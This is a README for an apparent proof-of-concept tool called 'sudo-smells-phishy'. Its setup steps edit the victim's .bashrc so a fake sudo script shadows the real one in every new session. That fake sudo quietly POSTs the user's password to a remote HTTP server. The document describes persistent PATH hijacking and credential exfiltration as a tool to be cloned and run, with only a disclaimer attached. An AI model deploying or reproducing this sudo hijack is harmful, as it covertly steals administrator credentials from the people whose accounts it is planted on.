# sudo-smells-phishy

### Setup:
1. Clone into an obscure directory
2. Run `setup.py`

This adds a line to the user's `.bashrc` which prepends the path to the phishy sudo script (`bin/sudo`) to the `PATH` environment variable every time a new session is created. 

In every subsequently created session (until the end of time), the script at `bin/sudo` will be triggered instead of `/usr/bin/sudo` every time the user uses the `sudo` command. 

This script behaves exactly the same as the real `sudo` outwardly but also POSTs the credentials to an http server sitting at `$url`.


*DISCLAIMER: THIS IS MERELY A PROOF OF CONCEPT. DO NOT USE THIS FOR ILLEGAL/UNETHICAL PURPOSES. YOU WILL BE HELD LIABLE. I AM NOT RESPONSIBLE FOR YOUR INSANITY.*
